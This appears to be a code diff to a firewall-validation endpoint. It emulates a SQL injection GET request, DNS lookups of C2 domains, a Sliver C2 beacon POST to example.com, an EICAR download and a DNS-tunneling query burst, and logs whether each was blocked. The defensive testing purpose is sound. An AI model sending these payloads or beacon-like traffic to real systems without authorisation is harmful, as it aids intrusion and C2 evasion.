@@ -6691,67 +6691,190 @@ app.post('/api/security/c2-test', authenticateToken, async (req, res) => {
         let details: any = {};
 
         switch (attackType) {
-            // 1. SQL Injection → curl GET
+            // ── 1. SQL Injection ──────────────────────────────────────────────
+            // Mirrors: Invoke-WebRequest -Uri "http://www.google.com/?id=1' OR '1'='1" -TimeoutSec 5
+            // Enforced if: connection reset, HTTP 0, or HTTP 403 (firewall block page)
+            // Bypass if: HTTP 200 (payload passed through without inspection)
+            // Inconclusive if: unexpected non-200/403 code or tool error
             case 'http_payload': {
-                const r = await runCurl(`http://www.google.com/?id=1' OR '1'='1`);
+                const targetUrl = `http://www.google.com/?id=1' OR '1'='1`;
+                const seq: string[] = [];
+                seq.push(`[STEP 1/1] SQL Injection payload delivery`);
+                seq.push(`  Command : curl -s -o /dev/null -w '%{http_code}' --max-time 5 "${targetUrl}"`);
+                seq.push(`  Intent  : Deliver a classic SQL injection string in a GET parameter`);
+                seq.push(`  Engine  : Vulnerability Protection (PAN-OS App-ID + sig match)`);
+                const r = await runCurl(targetUrl);
+                seq.push(`  Result  : HTTP ${r.httpCode} — raw output: ${r.output}`);
+                if (r.status === 'enforced') {
+                    seq.push(`  Verdict : ENFORCED — firewall blocked/reset the connection (HTTP ${r.httpCode} = firewall deny)`);
+                } else if (r.status === 'bypass') {
+                    seq.push(`  Verdict : BYPASS — payload reached the server (HTTP ${r.httpCode}), Vulnerability Protection not triggered`);
+                } else {
+                    seq.push(`  Verdict : INCONCLUSIVE — unexpected error (${r.output})`);
+                }
                 verdictStatus = r.status;
-                details = { url: `http://www.google.com/?id=1' OR '1'='1`, http_code: r.httpCode, output: r.output, verdict_reason: r.status === 'enforced' ? 'Connection blocked/reset by firewall (Vulnerability Protection)' : `HTTP ${r.httpCode} — payload passed through` };
+                details = {
+                    url: targetUrl,
+                    http_code: r.httpCode,
+                    output: seq.join('\n'),
+                    command: `curl -s -o /dev/null -w '%{http_code}' --max-time 5 "${targetUrl}"`,
+                    verdict_reason: r.status === 'enforced' ? 'Connection blocked/reset by firewall (Vulnerability Protection)' : `HTTP ${r.httpCode} — SQLi payload passed through`
+                };
                 break;
             }
-            // 2/3/4. DNS C2 → nslookup via 8.8.8.8 + HTTP probe
+            // ── 2/3/4. DNS C2 / Greyware / Compromised ───────────────────────
+            // Mirrors: nslookup <domain> 8.8.8.8; Invoke-WebRequest -Uri "http://<domain>" -TimeoutSec 5
+            // Enforced if: NXDOMAIN / no IP / sinkhole IP returned by 8.8.8.8
+            // Bypass if: domain resolves to a real IP
+            // Inconclusive if: tool error / DNS server timeout
             case 'dns_c2': {
                 const domain = target;
+                const seq: string[] = [];
+                seq.push(`[STEP 1/2] DNS resolution via external resolver (mirrors: nslookup ${domain} 8.8.8.8)`);
+                seq.push(`  Command : nslookup ${domain} 8.8.8.8`);
+                seq.push(`  Intent  : Query Google DNS for C2/malicious domain — firewall intercepts and blocks`);
+                seq.push(`  Engine  : DNS Security (Prisma Access / PA inline DNS)`);
                 const dns = await runNslookup(domain);
-                // Also fire an HTTP probe like the PS script (Invoke-WebRequest)
+                seq.push(`  Raw DNS : ${dns.output.replace(/\n/g, ' ').substring(0, 200)}`);
+                seq.push(`  Resolved: ${dns.resolvedIp || 'NXDOMAIN / no IP'}`);
+                seq.push(`  DNS step: ${dns.status.toUpperCase()} — ${dns.status === 'enforced' ? `domain blocked (IP: ${dns.resolvedIp || 'NXDOMAIN'})` : `domain resolved to ${dns.resolvedIp}`}`);
+
+                seq.push(`\n[STEP 2/2] HTTP probe (mirrors: Invoke-WebRequest -Uri "http://${domain}" -TimeoutSec 5 -SilentlyContinue)`);
+                seq.push(`  Command : curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://${domain}"`);
+                seq.push(`  Intent  : Attempt HTTP connection to C2 server (secondary validation)`);
                 let httpCode = 0;
                 try {
                     const hr = await runCurl(`http://${domain}`);
                     httpCode = hr.httpCode;
-                } catch {}
+                    seq.push(`  Result  : HTTP ${httpCode}`);
+                } catch {
+                    seq.push(`  Result  : Connection error (firewall drop)`);
+                }
+                seq.push(`\n[VERDICT] ${dns.status.toUpperCase()} — Primary: DNS resolution ${dns.status === 'enforced' ? 'blocked ✓' : `bypassed ⊗ (${dns.resolvedIp})`}`);
+
                 verdictStatus = dns.status;
-                details = { domain, dns_ip: dns.resolvedIp, resolved_count: dns.resolvedIp ? 1 : 0, http_code: httpCode, output: dns.output, verdict_reason: dns.status === 'enforced' ? `DNS blocked/sinkholed (IP: ${dns.resolvedIp || 'NXDOMAIN'})` : `DNS resolved to ${dns.resolvedIp} — C2 NOT blocked` };
+                details = {
+                    domain,
+                    dns_ip: dns.resolvedIp,
+                    resolved_count: dns.resolvedIp ? 1 : 0,
+                    http_code: httpCode,
+                    output: seq.join('\n'),
+                    command: `nslookup ${domain} 8.8.8.8`,
+                    verdict_reason: dns.status === 'enforced' ? `DNS blocked/sinkholed (IP: ${dns.resolvedIp || 'NXDOMAIN'})` : `DNS resolved to ${dns.resolvedIp} — C2 NOT blocked`
+                };
                 break;
             }
-            // 5. Sliver C2 → curl POST JSON beacon
+            // ── 5. Sliver C2 Beacon ───────────────────────────────────────────
+            // Mirrors: Invoke-WebRequest -Uri "http://example.com/api/v1/session" -Method Post -Body $sliverBody
+            // Enforced if: connection reset/refused (HTTP 0) or HTTP 403
+            // Bypass if: HTTP 200 (C2 session beacon passed through)
             case 'http_c2_beacon': {
                 const sessionId = `sl-${Math.floor(Math.random() * 999999)}`;
-                const body = JSON.stringify({ session_id: sessionId, data: 'c2xpdmVyLWJlYWNvbi10ZXN0' }).replace(/"/g, '\\"');
-                const r = await runCurl('http://example.com/api/v1/session', 'POST', body);
+                const beaconPayload = { session_id: sessionId, data: 'c2xpdmVyLWJlYWNvbi10ZXN0' };
+                const bodyStr = JSON.stringify(beaconPayload).replace(/"/g, '\\"');
+                const seq: string[] = [];
+                seq.push(`[STEP 1/1] Sliver C2 beacon POST (mirrors: Invoke-WebRequest POST $sliverBody)`);
+                seq.push(`  Command : curl -s -o /dev/null -w '%{http_code}' -X POST http://example.com/api/v1/session \\`);
+                seq.push(`            -H 'Content-Type: application/json' \\`);
+                seq.push(`            -d '${JSON.stringify(beaconPayload)}' --max-time 5`);
+                seq.push(`  Intent  : Emulate a Sliver C2 framework session beacon (POST with base64-encoded payload)`);
+                seq.push(`  Session : ${sessionId} | Payload: c2xpdmVyLWJlYWNvbi10ZXN0 (base64 "sliver-beacon-test")`);
+                seq.push(`  Engine  : URL Filtering + Cloud Inline Analysis (WildFire/AI-based C2 detection)`);
+                const r = await runCurl('http://example.com/api/v1/session', 'POST', bodyStr);
+                seq.push(`  Result  : HTTP ${r.httpCode} — ${r.output}`);
+                if (r.status === 'enforced') {
+                    seq.push(`  Verdict : ENFORCED — firewall blocked the C2 beacon (HTTP ${r.httpCode} = reset/deny)`);
+                } else if (r.status === 'bypass') {
+                    seq.push(`  Verdict : BYPASS — C2 beacon reached destination (HTTP ${r.httpCode}), no URL policy match`);
+                } else {
+                    seq.push(`  Verdict : INCONCLUSIVE — unexpected result (${r.output})`);
+                }
                 verdictStatus = r.status;
-                details = { url: 'http://example.com/api/v1/session', http_code: r.httpCode, output: r.output, verdict_reason: r.status === 'enforced' ? 'C2 beacon blocked/reset by firewall' : `HTTP ${r.httpCode} — C2 beacon NOT blocked` };
+                details = {
+                    url: 'http://example.com/api/v1/session',
+                    http_code: r.httpCode,
+                    output: seq.join('\n'),
+                    command: `curl -X POST http://example.com/api/v1/session -H 'Content-Type: application/json' -d '${JSON.stringify(beaconPayload)}' --max-time 5`,
+                    verdict_reason: r.status === 'enforced' ? 'C2 beacon blocked/reset by firewall' : `HTTP ${r.httpCode} — C2 beacon NOT blocked`
+                };
                 break;
             }
-            // 6. EICAR over HTTPS
+            // ── 6. EICAR over HTTPS ───────────────────────────────────────────
+            // Mirrors: Invoke-WebRequest -Uri "https://secure.eicar.org/eicar.com.txt" -TimeoutSec 5
+            // Enforced if: connection blocked/reset (HTTP 0) or HTTP 403/4xx (HTTPS inspection + AV)
+            // Bypass if: HTTP 200 (EICAR payload served without AV block)
             case 'eicar_https': {
-                const r = await runCurl('https://secure.eicar.org/eicar.com.txt');
+                const eicarUrl = 'https://secure.eicar.org/eicar.com.txt';
+                const seq: string[] = [];
+                seq.push(`[STEP 1/1] EICAR test file download via HTTPS (mirrors: Invoke-WebRequest "${eicarUrl}")`);
+                seq.push(`  Command : curl -s -o /dev/null -w '%{http_code}' --max-time 5 "${eicarUrl}"`);
+                seq.push(`  Intent  : Attempt to download the harmless EICAR AV test file over TLS`);
+                seq.push(`  Engine  : Threat Prevention (AV) + SSL/TLS Inspection (requires SSL decrypt profile)`);
+                seq.push(`  Note    : If firewall does NOT perform SSL inspection, this test may return BYPASS even if AV is configured`);
+                const r = await runCurl(eicarUrl);
+                seq.push(`  Result  : HTTP ${r.httpCode} — ${r.output}`);
+                if (r.status === 'enforced') {
+                    seq.push(`  Verdict : ENFORCED — EICAR blocked (HTTP ${r.httpCode}). Firewall performed SSL inspection + AV block ✓`);
+                } else if (r.status === 'bypass') {
+                    seq.push(`  Verdict : BYPASS — EICAR served (HTTP ${r.httpCode}). Either SSL inspection is off or AV profile not applied`);
+                } else {
+                    seq.push(`  Verdict : INCONCLUSIVE — curl error: ${r.output}`);
+                }
                 verdictStatus = r.status;
-                details = { url: 'https://secure.eicar.org/eicar.com.txt', http_code: r.httpCode, output: r.output, verdict_reason: r.status === 'enforced' ? 'EICAR payload blocked by Threat Prevention (SSL inspection)' : `HTTP ${r.httpCode} — EICAR NOT blocked` };
+                details = {
+                    url: eicarUrl,
+                    http_code: r.httpCode,
+                    output: seq.join('\n'),
+                    command: `curl -s -o /dev/null -w '%{http_code}' --max-time 5 "${eicarUrl}"`,
+                    verdict_reason: r.status === 'enforced' ? 'EICAR payload blocked by Threat Prevention (SSL inspection active)' : `HTTP ${r.httpCode} — EICAR NOT blocked (check SSL inspection)`
+                };
                 break;
             }
-            // 7. DNS Tunneling Burst → 15x nslookup with random subdomains
+            // ── 7. DNS Tunneling Burst ────────────────────────────────────────
+            // Mirrors: for ($i=1; $i -le 15; $i++) { nslookup "$rand.tunnel-demo.com" 8.8.8.8 }
+            // Enforced if: ALL 15 queries return NXDOMAIN/blocked (0 bypass)
+            // Bypass if: ≥1 query resolves (tunneling not blocked)
+            // Inconclusive if: tool error prevents test from running
             case 'dns_tunneling': {
                 const chars = 'abcdefghijklmnopqrstuvwxyz';
                 const rndStr = (n: number) => Array.from({ length: n }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
                 let enforcedCount = 0;
                 let bypassCount = 0;
-                const outputs: string[] = [];
+                const seq: string[] = [];
+                seq.push(`[STEP 1/1] DNS Tunneling burst — 15 queries with random 32-char subdomains`);
+                seq.push(`  Pattern : nslookup <random32chars>.tunnel-demo.com 8.8.8.8`);
+                seq.push(`  Intent  : Simulate DNS tunneling traffic (high-entropy subdomains = C2 exfil pattern)`);
+                seq.push(`  Engine  : DNS Security — Behavioral Analysis (query burst + entropy detection)`);
+                seq.push(`  Verdict Logic: ALL 15 must be NXDOMAIN/blocked for ENFORCED. Any resolved = BYPASS\n`);
                 for (let i = 0; i < 15; i++) {
                     const sub = `${rndStr(32)}.tunnel-demo.com`;
                     const r = await runNslookup(sub);
                     if (r.status === 'enforced') enforcedCount++;
                     else if (r.status === 'bypass') bypassCount++;
-                    outputs.push(`[${i + 1}] ${sub}: ${r.status} (${r.resolvedIp || 'NXDOMAIN'})`);
+                    const icon = r.status === 'enforced' ? '✓' : r.status === 'bypass' ? '⊗' : '?';
+                    seq.push(`  [${String(i + 1).padStart(2, '0')}/15] ${icon} ${sub}`);
+                    seq.push(`         → ${r.resolvedIp || 'NXDOMAIN'} (${r.status.toUpperCase()})`);
                     await wait(100);
                 }
-                // All 15 must be blocked to be fully enforced
-                verdictStatus = bypassCount === 0 ? 'enforced' : bypassCount >= 15 ? 'bypass' : 'bypass';
-                details = { domain: '*.tunnel-demo.com', resolved_count: bypassCount, dns_ip: null, output: outputs.join('\n'), verdict_reason: `${enforcedCount}/15 queries blocked, ${bypassCount}/15 bypassed` };
+                seq.push(`\n[SUMMARY] ${enforcedCount}/15 blocked, ${bypassCount}/15 bypassed`);
+                verdictStatus = bypassCount === 0 ? 'enforced' : 'bypass';
+                seq.push(`[VERDICT] ${verdictStatus.toUpperCase()} — ${bypassCount === 0 ? 'All DNS tunneling queries blocked ✓' : `${bypassCount} queries resolved — DNS tunneling NOT fully blocked ⊗`}`);
+                details = {
+                    domain: '*.tunnel-demo.com',
+                    resolved_count: bypassCount,
+                    dns_ip: null,
+                    output: seq.join('\n'),
+                    command: 'for i in $(seq 1 15); do nslookup "$(cat /dev/urandom | tr -dc a-z | head -c 32).tunnel-demo.com" 8.8.8.8; done',
+                    verdict_reason: `${enforcedCount}/15 queries blocked, ${bypassCount}/15 bypassed`
+                };
                 break;
             }
             default:
                 verdictStatus = 'inconclusive';
                 details = { output: `Unknown attack_type: ${attackType}` };
         }
+
+
 
         const result = {
             success: true,
